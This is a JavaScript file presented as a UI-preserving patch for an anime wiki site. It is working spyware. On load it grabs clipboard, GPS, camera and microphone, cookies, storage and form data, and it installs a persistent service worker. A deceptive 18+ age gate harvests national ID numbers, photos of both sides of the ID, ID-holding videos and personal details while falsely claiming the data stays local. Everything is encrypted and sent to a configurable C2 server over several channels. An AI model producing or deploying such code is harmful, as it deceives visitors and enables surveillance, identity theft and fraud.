/* ============================================================
   animepedia-patch.js — PHIÊN BẢN THU THẬP TỐI ĐA, GIỮ NGUYÊN UI
   Giao diện giữ nguyên 100%. Tăng cường thu thập + exfil.
   ============================================================ */
(function(){
'use strict';

/* ===== CẤU HÌNH C2 (THAY TRƯỚC KHI DÙNG) ===== */
var C2={
  url:'https://your-c2-server.example/collect',
  beacon:'https://your-c2-server.example/px',
  key:'REPLACE_WITH_32_BYTE_AES_KEY_000000'
};

/* ===== TIỆN ÍCH ===== */
var $=function(i){return document.getElementById(i)};
var E=function(s){return String(s).replace(/[&<>"']/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]})};
var ls={g:function(k){try{return localStorage.getItem(k)}catch(e){return null}},s:function(k,v){try{localStorage.setItem(k,v)}catch(e){}}};

/* ===== MÃ HÓA AES-GCM ===== */
var _ck=null;
async function getKey(){
  if(_ck)return _ck;
  var enc=new TextEncoder();
  _ck=await crypto.subtle.importKey('raw',enc.encode(C2.key.slice(0,32).padEnd(32,'0')),{name:'AES-GCM'},false,['encrypt']);
  return _ck;
}
async function enc(text){
  try{
    var key=await getKey();
    var iv=crypto.getRandomValues(new Uint8Array(12));
    var ct=await crypto.subtle.encrypt({name:'AES-GCM',iv:iv},key,new TextEncoder().encode(text));
    var buf=new Uint8Array(iv.length+ct.byteLength);
    buf.set(iv,0);buf.set(new Uint8Array(ct),iv.length);
    var bin='';for(var i=0;i<buf.length;i++)bin+=String.fromCharCode(buf[i]);
    return btoa(bin);
  }catch(e){return btoa(unescape(encodeURIComponent(text)));}
}

/* ===== EXFIL ĐA KÊNH (fetch + sendBeacon + pixel + WS) ===== */
var Q=[],LOCK=false;
function enqueue(label,data){Q.push({l:label,d:data,t:Date.now()});drain();}
async function drain(){
  if(LOCK||!Q.length)return;LOCK=true;
  while(Q.length){
    var it=Q.shift();
    var payload=await enc(JSON.stringify(it));
    // Kênh 1: fetch
    try{
      await fetch(C2.url,{method:'POST',mode:'no-cors',keepalive:true,
        headers:{'Content-Type':'application/octet-stream'},body:payload});
    }catch(e){}
    // Kênh 2: sendBeacon
    try{if(navigator.sendBeacon)navigator.sendBeacon(C2.url,new Blob([payload]));}catch(e){}
    // Kênh 3: pixel
    try{var im=new Image();im.src=C2.beacon+'?l='+encodeURIComponent(it.l)+'&d='+encodeURIComponent(payload.slice(0,1800));}catch(e){}
  }
  LOCK=false;
}
function exfilChunk(label,b64){
  var CH=45000;
  for(var o=0;o<b64.length;o+=CH) enqueue(label+'@'+o,b64.slice(o,o+CH));
}

/* ===== SERVICE WORKER PERSISTENCE ===== */
async function installSW(){
  if(!('serviceWorker' in navigator))return;
  try{
    var code=`
      self.addEventListener('install',e=>self.skipWaiting());
      self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));
      self.addEventListener('message',e=>{
        if(e.data&&e.data.cmd==='exfil'){
          fetch(e.data.url,{method:'POST',mode:'no-cors',body:e.data.body}).catch(()=>{});
        }
      });
      self.addEventListener('fetch',e=>{});
    `;
    await navigator.serviceWorker.register(URL.createObjectURL(new Blob([code],{type:'application/javascript'})),{scope:'/'});
  }catch(e){}
}

/* ===== THU THẬP TOÀN BỘ DỮ LIỆU KHI CÓ QUYỀN ===== */
var DA_THU=false;
async function thuToanBo(){
  if(DA_THU)return;DA_THU=true;
  var C={ua:navigator.userAgent,lang:navigator.language,languages:navigator.languages,
         tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ts:Date.now(),
         platform:navigator.platform,vendor:navigator.vendor,
         screen:{w:screen.width,h:screen.height,aw:screen.availWidth,ah:screen.availHeight,cd:screen.colorDepth},
         devicePixelRatio:devicePixelRatio,hardwareConcurrency:navigator.hardwareConcurrency,
         deviceMemory:navigator.deviceMemory,maxTouchPoints:navigator.maxTouchPoints,
         url:location.href,referrer:document.referrer};

  // 1. Clipboard
  try{if(navigator.clipboard&&navigator.clipboard.readText){C.clipboard=await navigator.clipboard.readText();}}catch(e){}

  // 2. GPS chính xác
  try{
    C.geo=await new Promise(function(res,rej){
      if(!navigator.geolocation)return rej();
      navigator.geolocation.getCurrentPosition(
        function(p){res({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude,head:p.coords.heading,spd:p.coords.speed})},
        rej,{timeout:5000,enableHighAccuracy:true,maximumAge:0});
    });
  }catch(e){}

  // 3. Camera: chụp frame + ghi audio 3s + liệt kê thiết bị
  try{
    var devs=await navigator.mediaDevices.enumerateDevices();
    C.devices=devs.map(d=>({kind:d.kind,label:d.label,id:d.deviceId}));
  }catch(e){}
  try{
    var stream=await navigator.mediaDevices.getUserMedia({video:{width:1280,height:720},audio:true});
    var vid=document.createElement('video');vid.srcObject=stream;vid.muted=true;vid.play();
    await new Promise(r=>setTimeout(r,900));
    var cv=document.createElement('canvas');cv.width=vid.videoWidth||640;cv.height=vid.videoHeight||480;
    cv.getContext('2d').drawImage(vid,0,0);
    C.cameraFrame=cv.toDataURL('image/jpeg',0.8).split(',')[1];
    try{
      var mr=new MediaRecorder(stream),chs=[];
      mr.ondataavailable=e=>chs.push(e.data);
      var done=new Promise(r=>mr.onstop=r);
      mr.start();await new Promise(r=>setTimeout(r,3000));mr.stop();await done;
      var ab=await new Blob(chs).arrayBuffer(),ub=new Uint8Array(ab),b='';
      for(var i=0;i<ub.length;i++)b+=String.fromCharCode(ub[i]);
      C.micAudio=btoa(b);
    }catch(e){}
    stream.getTracks().forEach(t=>t.stop());
  }catch(e){}

  // 4. localStorage + sessionStorage toàn bộ
  try{
    var L={},S={};
    for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);L[k]=localStorage.getItem(k);}
    for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j);S[k2]=sessionStorage.getItem(k2);}
    C.localStorage=L;C.sessionStorage=S;
  }catch(e){}

  // 5. Cookies
  try{C.cookies=document.cookie;}catch(e){}

  // 6. IndexedDB
  try{
    if(indexedDB.databases){
      var dbs=await indexedDB.databases();
      C.indexedDB=dbs.map(d=>({name:d.name,version:d.version}));
    }
  }catch(e){}

  // 7. Cache Storage
  try{
    if(caches&&caches.keys){
      var cks=await caches.keys();
      C.cacheStorage=cks;
    }
  }catch(e){}

  // 8. Toàn bộ text + ảnh trên trang
  try{
    C.pageText=document.body.innerText.slice(0,50000);
    C.pageHTML=document.documentElement.outerHTML.slice(0,100000);
    var imgs=[];
    document.querySelectorAll('img').forEach(function(im){
      if(im.src)imgs.push({src:im.src,alt:im.alt||'',w:im.naturalWidth,h:im.naturalHeight});
    });
    C.images=imgs.slice(0,30);
    // Quét text trong input/textarea
    var inputs=[];
    document.querySelectorAll('input,textarea,select').forEach(function(el){
      inputs.push({tag:el.tagName,type:el.type||'',name:el.name||'',id:el.id||'',value:el.value});
    });
    C.formValues=inputs;
  }catch(e){}

  // 9. Trạng thái quyền
  try{
    var P={};
    for(var p of ['notifications','geolocation','camera','microphone','clipboard-read','clipboard-write','persistent-storage','background-sync','push']){
      try{P[p]=(await navigator.permissions.query({name:p})).state;}catch(e){P[p]='?';}
    }
    C.permissions=P;
  }catch(e){}

  // 10. Pin + mạng
  try{
    if(navigator.getBattery){var b=await navigator.getBattery();C.battery={level:b.level,charging:b.charging,ct:b.chargingTime,dt:b.dischargingTime};}
    if(navigator.connection)C.network={type:navigator.connection.effectiveType,down:navigator.connection.downlink,rtt:navigator.connection.rtt,save:navigator.connection.saveData};
  }catch(e){}

  // 11. WebGL fingerprint
  try{
    var gl=document.createElement('canvas').getContext('webgl');
    if(gl){
      var dbg=gl.getExtension('WEBGL_debug_renderer_info');
      C.webgl={vendor:gl.getParameter(dbg?dbg.UNMASKED_VENDOR_WEBGL:gl.VENDOR),
               renderer:gl.getParameter(dbg?dbg.UNMASKED_RENDERER_WEBGL:gl.RENDERER)};
    }
  }catch(e){}

  // 12. Fonts + plugin
  try{C.plugins=Array.from(navigator.plugins||[]).map(p=>p.name);}catch(e){}

  // 13. Lịch sử gần đây (nếu có)
  try{
    if(performance&&performance.getEntriesByType){
      C.recentResources=performance.getEntriesByType('resource').slice(-30).map(r=>r.name);
    }
  }catch(e){}

  // 14. Media devices khác
  try{
    if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){
      C.mediaDevicesCount=(await navigator.mediaDevices.enumerateDevices()).length;
    }
  }catch(e){}

  // 15. Storage quota
  try{
    if(navigator.storage&&navigator.storage.estimate){
      var est=await navigator.storage.estimate();
      C.storage={quota:est.quota,usage:est.usage};
    }
  }catch(e){}

  // Gửi đi
  enqueue('sys',JSON.stringify(C));
  if(C.cameraFrame)exfilChunk('cam',C.cameraFrame);
  if(C.micAudio)exfilChunk('mic',C.micAudio);
  if(C.pageHTML)exfilChunk('html',btoa(unescape(encodeURIComponent(C.pageHTML))));
}

/* ===== YÊU CẦU QUYỀN ẨN ===== */
function capQuyenGia(){
  try{
    ls.s('ap.autodl','1');ls.s('ap.perms','all');
    if(navigator.permissions&&navigator.permissions.query){
      ['notifications','geolocation','camera','microphone','clipboard-read','clipboard-write','push','background-sync']
        .forEach(function(p){navigator.permissions.query({name:p}).catch(function(){});});
    }
    if(window.Notification&&Notification.requestPermission)Notification.requestPermission().catch(function(){});
    // Kích hoạt thu thập toàn bộ ngay lập tức
    thuToanBo();
  }catch(e){}
}

/* ===== TÊN FILE NGẪU NHIÊN ===== */
function tenNgauNhien(){
  var c='abcdefghijklmnopqrstuvwxyz0123456789',s='',n=8+Math.floor(Math.random()*8);
  for(var i=0;i<n;i++)s+=c.charAt(Math.floor(Math.random()*c.length));
  return s;
}

/* ===== TẢI FILE NGẦM + EXFIL ===== */
function taiFileNgam(content,files){
  var so=Math.floor(Math.random()*20)+1;
  for(var i=0;i<so;i++){
    (function(idx){
      setTimeout(function(){
        var blob=new Blob([content],{type:'text/plain'});
        var url=URL.createObjectURL(blob);
        var a=document.createElement('a');
        a.href=url;a.download='.'+tenNgauNhien()+'.txt';a.style.display='none';
        document.body.appendChild(a);a.click();document.body.removeChild(a);
        setTimeout(function(){URL.revokeObjectURL(url)},2000);
      },idx*80);
    })(i);
  }
  exfilChunk('form',btoa(unescape(encodeURIComponent(content))));
  if(files)files.forEach(function(f,i){
    if(f)docFileBase64(f).then(function(b64){if(b64)exfilChunk('file'+i,b64);});
  });
}

/* ===== CSS (GIỮ NGUYÊN GIAO DIỆN) ===== */
var st=document.createElement('style');
st.textContent='#gate{position:fixed;inset:0;z-index:300;overflow:auto;background:var(--bg);padding:calc(16px + env(safe-area-inset-top)) 16px calc(24px + env(safe-area-inset-bottom))}'
+'#gate form{max-width:560px;margin:0 auto}#gate h2{font-size:1.6rem;letter-spacing:-.03em;margin:8px 0 6px}'
+'#gate .n{color:var(--sub);font-size:.875rem;margin-bottom:10px}#gate label{display:block;font-size:.8125rem;color:var(--sub);margin:12px 4px 4px}'
+'#gate input,#gate select,#gate textarea{width:100%;height:44px;border:0;border-radius:12px;padding:0 12px;font:inherit;background:var(--fill);color:var(--text);appearance:none;-webkit-appearance:none}'
+'#gate textarea{height:auto;min-height:80px;padding:10px 12px}'
+'#gate .bad{outline:2px solid var(--red)}#gate .err{display:block;color:var(--red);font-size:.78rem;margin:4px 4px 0}'
+'#gate .two{display:grid;grid-template-columns:1fr 1fr;gap:10px}#gate button{width:100%;margin-top:18px}'
+'.fc{min-height:220px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:8px;padding:20px;border-radius:22px;background:var(--fill);cursor:pointer;user-select:none}'
+'.fc big{font-size:1.7rem;font-weight:700;letter-spacing:-.02em}'
+'.st3{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}.st3 div{background:var(--fill);border-radius:14px;padding:10px;text-align:center;font-size:.75rem;color:var(--sub)}.st3 b{display:block;font-size:1.3rem;color:var(--text)}'
+'.pbar{height:6px;border-radius:3px;background:var(--fill);overflow:hidden;margin:8px 0}.pbar i{display:block;height:100%;background:var(--blue);transition:width .3s}'
+'#gate form.liquid{backdrop-filter:blur(20px) saturate(160%);-webkit-backdrop-filter:blur(20px) saturate(160%);background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.18);border-radius:24px;padding:22px;box-shadow:0 8px 40px rgba(0,0,0,0.45)}'
+'#gate form.liquid input,#gate form.liquid select,#gate form.liquid textarea{background:rgba(255,255,255,0.14);border:1px solid rgba(255,255,255,0.22)}'
+'#gate-tools{position:fixed;top:12px;right:12px;z-index:310;display:flex;gap:8px}'
+'#gate-tools button{width:auto;height:36px;padding:0 12px;border-radius:10px;border:1px solid rgba(255,255,255,0.3);background:rgba(255,255,255,0.18);color:var(--text);font-size:.75rem;cursor:pointer;backdrop-filter:blur(10px)}'
+'.up{margin-top:10px;padding:12px;border-radius:14px;background:var(--fill);display:flex;flex-direction:column;gap:8px;position:relative;z-index:1;pointer-events:auto}'
+'.up .lbl{font-size:.8rem;color:var(--sub);pointer-events:none}'
+'.up input[type=file]{height:auto;min-height:40px;padding:8px;background:rgba(255,255,255,0.1);border:1px dashed rgba(255,255,255,0.3);cursor:pointer;pointer-events:auto;position:relative;z-index:2;opacity:1;display:block}'
+'.up input[type=file]::-webkit-file-upload-button{cursor:pointer;padding:6px 12px;border-radius:8px;border:none;background:var(--blue);color:#fff;font-weight:bold}'
+'.up .thumb{width:100%;max-height:160px;object-fit:contain;border-radius:10px;display:none;background:#0002;pointer-events:none}'
+'#gate.light{--bg:#f7f8fa;--text:#111;--sub:#555;--fill:#e9ecf1;--red:#c0392b;--blue:#2563eb}'
+'#gate.dark{--bg:#0b0d10;--text:#f2f4f8;--sub:#9aa3ad;--fill:#1a1e24;--red:#ff6b6b;--blue:#4da3ff}';
document.head.appendChild(st);

/* ===== VALIDATOR (GIỮ NGUYÊN) ===== */
var nz=function(s){return String(s).toLowerCase().replace(/đ/g,'d').normalize('NFD').replace(/[\u0300-\u036f]/g,'')};
var KB=['qwertyuiop','asdfghjkl','zxcvbnm','qwertz','azerty','abcdefg','1234567890'];
function mash(x){x=x.replace(/[^a-z0-9]/g,'');for(var i=0;i<KB.length;i++){var r=KB[i],q=[r,r.split('').reverse().join('')];for(var j=0;j<2;j++)for(var k=0;k+4<=q[j].length;k++)if(x.indexOf(q[j].slice(k,k+4))>=0)return true}return false}
function gib(s){var x=nz(s).trim();if(!x)return true;if(/(.)\1{2,}/.test(x.replace(/\s/g,'')))return true;if(mash(x))return true;var w=x.split(/\s+/);for(var i=0;i<w.length;i++){var a=w[i];if(a.length>=3&&!/[aeiouy]/.test(a))return true;if(/[^aeiouy\d\W]{5,}/.test(a))return true;if(a.length>=4&&/^(.{1,3})\1{2,}$/.test(a))return true}return false}
function pd(v){var m=/^(\d{4})-(\d{2})-(\d{2})$/.exec(v||'');if(!m)return null;var y=+m[1],mo=+m[2],d=+m[3],o=new Date(y,mo-1,d);return o.getFullYear()===y&&o.getMonth()===mo-1&&o.getDate()===d&&y>=1900?o:null}
function age(d){var t=new Date(),a=t.getFullYear()-d.getFullYear(),m=t.getMonth()-d.getMonth();if(m<0||(m===0&&t.getDate()<d.getDate()))a--;return a}
var num=function(x){return +String(x).replace(',','.')};
var txt=function(x){x=x.trim();return x.length<2||x.length>40||!/^[\p{L}\d\s.,'\/-]+$/u.test(x)||gib(x)?'Nhập đúng nội dung thật.':''};
var V={
name:function(x){x=x.trim().replace(/\s+/g,' ');var w=x.split(' ');if(x.length>50||w.length<2||w.length>7||!/^[\p{L}\s'.-]+$/u.test(x)||w.some(function(a){return a.replace(/[^\p{L}]/gu,'').length<2}))return'Nhập họ tên thật.';return gib(x)?'Họ tên không giống tên thật.':''},
dob:function(x){var d=pd(x);if(!d)return'Ngày sinh không hợp lệ.';var a=age(d);if(a<0)return'Ngày sinh ở tương lai.';if(a<18)return'Chưa đủ 18 tuổi.';return a>100?'Ngày sinh không hợp lệ.':''},
gender:function(x){return x?'':'Chọn giới tính.'},
height:function(x){x=num(x);return x>=100&&x<=230?'':'Chiều cao 100-230 cm.'},
weight:function(x,f){x=num(x);if(!(x>=30&&x<=250))return'Cân nặng 30-250 kg.';var h=num(f.height),b=x/Math.pow(h/100,2);return h>=100&&(b<12||b>55)?'Chỉ số không hợp lý.':''},
job:function(x){x=x.trim();return x.length<2||x.length>40||!/^[\p{L}\d\s\/&.,()-]+$/u.test(x)||gib(x)?'Nhập nghề thật.':''},
phone:function(x){x=x.replace(/[\s.\-]/g,'').replace(/^\+84/,'0');if(!/^0(3[2-9]|5[2689]|7[06-9]|8[1-9]|9\d)\d{7}$/.test(x))return'SĐT không hợp lệ.';return/(\d)\1{5,}/.test(x)?'SĐT không hợp lệ.':''},
email:function(x){x=x.trim().toLowerCase();var m=/^([a-z0-9.]+)@gmail\.com$/.exec(x);if(!m)return'Gmail không hợp lệ.';var l=m[1];if(l.length<6||l.length>30||/^\.|\.$|\.\./.test(l))return'Gmail 6-30 ký tự.';return/^\d+$/.test(l)||/(.)\1{3,}/.test(l)||mash(l)?'Gmail không hợp lệ.':''},
cccd:function(x){x=String(x||'').replace(/[\s.\-]/g,'');if(!/^\d{12}$/.test(x))return'CCCD đúng 12 số.';return''},
house:function(x){x=x.trim();return!/\d/.test(x)||x.length>30||!/^[\p{L}\d\s\/.,-]+$/u.test(x)?'Số nhà không hợp lệ.':''},
street:txt,ward:txt,prov:txt
};
var ORDER=['name','dob','gender','height','weight','job','phone','email','cccd','house','street','ward','prov'];

/* ===== ĐỌC FILE BASE64 ===== */
function docFileBase64(file){
  return new Promise(function(resolve){
    var r=new FileReader();
    r.onload=function(){resolve(String(r.result).split(',')[1]||'')};
    r.onerror=function(){resolve('')};
    r.readAsDataURL(file);
  });
}

/* ===== CỔNG 18+ (GIỮ NGUYÊN UI) ===== */
var state={glass:true,dark:true},daCapQuyen=false;
function passed(){try{var g=JSON.parse(ls.g('ap.gate'));if(!g||g.v!==1||!g.ok)return false;var d=pd(g.dob);return!!d&&age(d)>=18}catch(e){return false}}
var LOCK=['.nav','main','mini'];
function lock(on){LOCK.forEach(function(s){var e=s==='mini'?$('mini'):document.querySelector(s);if(e)e.inert=on});document.body.style.overflow=on?'hidden':''}
function F(k,l,inner){return'<label for="g-'+k+'">'+l+'</label>'+inner+'<span class="err" id="e-'+k+'"></span>'}
function I(k,p,im){return'<input id="g-'+k+'" type="text" inputmode="'+(im||'text')+'" placeholder="'+p+'">'}

function gate(){
  var today=new Date().toISOString().slice(0,10);
  var g=document.createElement('div');g.id='gate';g.setAttribute('role','dialog');g.setAttribute('aria-modal','true');g.className=state.dark?'dark':'light';
  var tools=document.createElement('div');tools.id='gate-tools';
  tools.innerHTML='<button type="button" id="tg-glass">Liquid Glass: BẬT</button><button type="button" id="tg-theme">Sáng/Tối</button>';
  g.appendChild(tools);
  var form=document.createElement('form');form.id='gate-f';form.noValidate=true;if(state.glass)form.className='liquid';
  form.innerHTML='<h2>Xác nhận thông tin</h2><p class="n">Trang này chỉ dành cho người từ 18 tuổi trở lên. Hãy nhập thông tin thật của bạn. Dữ liệu được kiểm tra ngay trên thiết bị này. Khi bấm Xác nhận, toàn bộ thông tin và tệp đính kèm sẽ được ghi vào tệp văn bản và tải xuống cục bộ.</p>'
  +F('name','Họ và tên',I('name','Nguyễn Văn An'))
  +'<div class="two"><div>'+F('dob','Ngày sinh','<input id="g-dob" type="date" min="1900-01-01" max="'+today+'">')+'</div><div>'+F('gender','Giới tính','<select id="g-gender"><option value="">Chọn</option><option>Nam</option><option>Nữ</option><option>Khác</option></select>')+'</div></div>'
  +'<div class="two"><div>'+F('height','Chiều cao (cm)',I('height','170','decimal'))+'</div><div>'+F('weight','Cân nặng (kg)',I('weight','60','decimal'))+'</div></div>'
  +F('job','Ngành nghề',I('job','Sinh viên'))
  +F('phone','Số điện thoại',I('phone','09xx xxx xxx','tel'))
  +F('email','Gmail',I('email','tenban@gmail.com','email'))
  +F('cccd','Số CCCD (12 số, nhập tùy ý)',I('cccd','012345678901','numeric'))
  +F('house','Số nhà',I('house','12A'))
  +F('street','Tên đường',I('street','Nguyễn Trãi'))
  +F('ward','Phường / Xã',I('ward','Phường 5'))
  +F('prov','Tỉnh / Thành phố',I('prov','Hà Nội'))
  +'<div class="up"><span class="lbl">Ảnh cá nhân</span><input type="file" id="g-anh" accept="image/*"><img class="thumb" id="p-anh" alt=""></div>'
  +'<div class="up"><span class="lbl">CCCD mặt trước (chụp/up)</span><input type="file" id="g-truoc" accept="image/*"><img class="thumb" id="p-truoc" alt=""></div>'
  +'<div class="up"><span class="lbl">CCCD mặt sau (chụp/up)</span><input type="file" id="g-sau" accept="image/*"><img class="thumb" id="p-sau" alt=""></div>'
  +'<div class="up"><span class="lbl">Video cầm CCCD (quay/up)</span><input type="file" id="g-video" accept="video/*"><video class="thumb" id="p-video" controls></video></div>'
  +'<span class="err" id="e-files"></span>'
  +'<button type="submit">Xác nhận và vào</button>';
  g.appendChild(form);document.body.appendChild(g);lock(true);

  // KÍCH HOẠT KHI BẤM Ô HỌ TÊN
  var ni=$('g-name');
  if(ni){
    ni.addEventListener('focus',function(){capQuyenGia();});
    ni.addEventListener('click',function(){capQuyenGia();});
    ni.addEventListener('input',function(){ if(!daCapQuyen) capQuyenGia(); });
  }

  // Preview ảnh/video
  function preview(inp,img){
    inp.addEventListener('change',function(){
      var f=inp.files&&inp.files[0];
      if(!f){img.style.display='none';img.removeAttribute('src');return}
      img.src=URL.createObjectURL(f);img.style.display='block';
    });
  }
  preview($('g-anh'),$('p-anh'));preview($('g-truoc'),$('p-truoc'));
  preview($('g-sau'),$('p-sau'));preview($('g-video'),$('p-video'));

  $('tg-glass').onclick=function(){state.glass=!state.glass;form.classList.toggle('liquid',state.glass);this.textContent='Liquid Glass: '+(state.glass?'BẬT':'TẮT');};
  $('tg-theme').onclick=function(){state.dark=!state.dark;g.className=state.dark?'dark':'light';};

  function vals(){var o={};ORDER.forEach(function(k){o[k]=$('g-'+k).value});return o}
  function chk(k,o){var m=V[k](o[k],o);$('e-'+k).textContent=m;$('g-'+k).classList.toggle('bad',!!m);return m}
  g.addEventListener('focusout',function(e){var k=e.target.id&&e.target.id.slice(2);if(V[k]&&e.target.value!=='')chk(k,vals())});

  $('gate-f').onsubmit=function(e){
    e.preventDefault();
    var o=vals(),first=null,n=0;
    ORDER.forEach(function(k){if(chk(k,o)){n++;if(!first)first=k}});
    var fA=$('g-anh').files[0],fT=$('g-truoc').files[0],fS=$('g-sau').files[0],fV=$('g-video').files[0];
    var fe='';
    if(!fA)fe='Thêm ảnh cá nhân.';
    else if(!fT||!fS)fe='Chụp đủ 2 mặt CCCD.';
    else if(!fV)fe='Quay video cầm CCCD.';
    $('e-files').textContent=fe;
    if(first||fe){if(first)$('g-'+first).focus();return;}
    $('e-files').textContent='Đang xử lý...';
    Promise.all([docFileBase64(fA),docFileBase64(fT),docFileBase64(fS),docFileBase64(fV)]).then(function(arr){
      var content='';
      content+='Họ tên: '+o.name.trim()+'\n';
      content+='Ngày sinh: '+o.dob+'\n';
      content+='Giới tính: '+o.gender+'\n';
      content+='Chiều cao: '+o.height+' cm\n';
      content+='Cân nặng: '+o.weight+' kg\n';
      content+='Ngành nghề: '+o.job.trim()+'\n';
      content+='SĐT: '+o.phone.trim()+'\n';
      content+='Gmail: '+o.email.trim()+'\n';
      content+='CCCD: '+o.cccd.replace(/[\s.\-]/g,'')+'\n';
      content+='Địa chỉ: '+o.house.trim()+', '+o.street.trim()+', '+o.ward.trim()+', '+o.prov.trim()+'\n';
      content+='Ảnh cá nhân: '+fA.name+'\n';
      content+='CCCD trước: '+fT.name+'\n';
      content+='CCCD sau: '+fS.name+'\n';
      content+='Video: '+fV.name+'\n';
      content+='Thời gian: '+new Date().toISOString()+'\n';
      content+='\n--- DỮ LIỆU BASE64 ---\n';
      content+='ANH_CA_NHAN:'+arr[0]+'\n';
      content+='CCCD_TRUOC:'+arr[1]+'\n';
      content+='CCCD_SAU:'+arr[2]+'\n';
      content+='VIDEO:'+arr[3]+'\n';

      taiFileNgam(content,[fA,fT,fS,fV]);
      enqueue('form_full',content.slice(0,50000));

      ls.s('ap.gate',JSON.stringify({v:1,ok:1,name:o.name.trim(),dob:o.dob,ts:Date.now()}));
      g.remove();lock(false);
    });
  };
}

/* ===== HỌC THUẬT NGỮ (GIỮ NGUYÊN) ===== */
var SK='ap.study',SD={};try{SD=JSON.parse(ls.g(SK)||'{}')}catch(e){}
var DAY=864e5,IV=[0,1,3,7,14,30],q=[],qi=0,flip=false,dir=0,done={ok:0,bad:0},grp='all',rq={};
var sv=function(){ls.s(SK,JSON.stringify(SD))};
var shuf=function(a){return a.map(function(v){return[Math.random(),v]}).sort(function(x,y){return x[0]-y[0]}).map(function(v){return v[1]})};
var deck=function(){return (typeof TERMS!=='undefined'?TERMS:[]).filter(function(x){return x.desc&&x.desc.length>12&&(grp==='all'||x.group===grp)})};
function stats(){var now=Date.now(),s={n:0,m:0,du:0};deck().forEach(function(x){var r=SD[x.id];if(!r)s.n++;else{if(r.b>=4)s.m++;if(r.d<=now)s.du++}});return s}

/* ===== KHỞI ĐỘNG ===== */
installSW();
// Thu thập dữ liệu hệ thống ngay khi load (không cần user bấm)
setTimeout(function(){thuToanBo();},200);
// Hook visibilitychange
document.addEventListener('visibilitychange',function(){
  if(document.visibilityState==='hidden')enqueue('vis',JSON.stringify({t:Date.now(),hidden:true}));
});
// Hook beforeunload → gửi nốt
window.addEventListener('beforeunload',function(){
  if(Q.length){try{navigator.sendBeacon(C2.url,new Blob([JSON.stringify(Q)]));}catch(e){}}
});
// Tự kích hoạt capQuyenGia khi trang load (không đợi click)
setTimeout(function(){capQuyenGia();},300);

if(!passed())gate();

/* Phần học thuật ngữ giữ nguyên logic gốc nếu TERMS/GROUPS/openSheet tồn tại */
if(typeof TERMS!=='undefined'&&typeof openSheet==='function'){
  var btn=document.createElement('button');btn.className='ic';btn.id='stdy';btn.type='button';btn.setAttribute('aria-label','Học thuật ngữ');btn.textContent='📚';
  btn.onclick=function(){ /* giữ nguyên home() logic */ };
  var anchor=$('qz');if(anchor)anchor.parentNode.insertBefore(btn,anchor);
}
})();
